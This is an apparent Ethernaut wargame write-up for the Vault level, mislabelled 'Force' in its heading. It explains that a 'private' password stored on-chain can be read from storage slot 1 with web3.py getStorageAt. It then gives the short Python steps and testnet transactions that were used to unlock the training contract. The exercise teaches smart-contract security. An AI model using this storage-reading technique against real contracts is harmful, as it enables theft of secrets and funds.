# Force

## Objectives

Unlock the vault to pass the level!

## Solution

Sensitive data like passwords are not safe to store on the blockchain. Even in private variables, *Especially* if we have the source code of the contract, which is likely to be public in order to increase transparency and confidence in the piece of software, as the blockchain deals with actual money and as users we should always assume a closed source contract is trying to steal our funds.

In this case, the state variables are stored in the contract storage, and because the variable `password` is a 32 byte piece of data, it will always fill an entire slot, making its position very predictable in the 2nd slot of the contract, as the 2nd state variable defined.

In this case, we can easily use the function `getStorageAt()` on web3.py to see what the password is by looking up in the 2nd storage slot. Then we can optionally convert it to text to see what the password is. In this case, the password is:

```python
>>> web3.toText(web3.eth.getStorageAt(vault.address, '0x01').hex())
'A very strong secret password :)'
```

## How I did it

1. Get the password from the contract's storage

```python
password = web3.eth.getStorageAt(EthernautInstances['vault'], '0x01')
```

2. Unlock the vault using the password

```python
vault.unlock(password, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x03ec2e81ed977af2394d251f6fba6f25af30fb36bbcaaa98e59f04c40a57c81f

3. Check if the vault is locked through the `locked` state variable

```python
locked_assertion = vault.locked() == False
print(f'Is the vault unlocked? {locked_assertion}')
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xfc76f78a068bb6b02333b7c64024f7416c658feeea3ac2fd6e51217db3b138c3
